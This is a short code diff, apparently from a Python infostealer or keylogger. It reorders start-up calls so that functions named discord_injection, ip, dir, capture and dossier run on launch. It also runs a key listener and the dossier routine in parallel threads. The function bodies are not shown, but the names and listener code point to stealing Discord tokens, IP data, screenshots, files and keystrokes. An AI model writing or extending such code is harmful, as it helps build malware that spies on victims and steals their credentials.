@@ -130,13 +130,6 @@ def ip():
         print("Value error")
         time.sleep(3)
 
-discord_injection()
-ip()
-dir()
-capture()
-dossier()
-shutdown()
-
 
 buffer = ""
 timer = None
@@ -175,4 +168,12 @@ def start_listener():
     listener.start()
     listener.join()
 
-start_listener()
+
+discord_injection()
+ip()
+dir()
+capture()
+t1 = threading.Thread(target=start_listener)
+t2 = threading.Thread(target=dossier)
+t1.start()
+t2.start()
